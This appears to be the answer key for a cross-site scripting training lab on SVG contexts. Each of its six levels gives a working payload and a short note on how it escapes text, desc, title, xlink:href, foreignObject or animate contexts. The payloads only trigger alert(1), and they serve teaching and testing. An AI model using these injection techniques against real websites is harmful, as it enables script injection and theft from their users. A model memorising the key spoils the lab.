# svgctx — solutions

Reflection inside SVG sub-elements (text/desc/title/xlink:href/foreignObject/animate).

### svgctx-level1

`/svgctx/level1/?query=%3C/text%3E%3Csvg%20onload=alert(1)%3E`

- payload: `</text><svg onload=alert(1)>`
- context: break out of `<text>` then inject SVG with onload

### svgctx-level2

`/svgctx/level2/?query=%3C/desc%3E%3Csvg%20onload=alert(1)%3E`

- payload: `</desc><svg onload=alert(1)>`
- context: break out of `<desc>` then inject SVG with onload

### svgctx-level3

`/svgctx/level3/?query=%3C/title%3E%3Csvg%20onload=alert(1)%3E`

- payload: `</title><svg onload=alert(1)>`
- context: break out of `<title>` (RCDATA) then inject SVG with onload

### svgctx-level4

`/svgctx/level4/?query=javascript:alert(1)`

- payload: `javascript:alert(1)`
- context: query inside `xlink:href="..."` of `<a>` — javascript: URI

### svgctx-level5

`/svgctx/level5/?query=%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `<img src=x onerror=alert(1)>`
- context: foreignObject hosts XHTML; standard HTML injection works

### svgctx-level6

`/svgctx/level6/?query=%22/%3E%3Csvg%20onload=alert(1)%3E%3Crect%20x=%22`

- payload: `"/><svg onload=alert(1)><rect x="`
- context: break out of animate values attribute; inject svg onload sibling
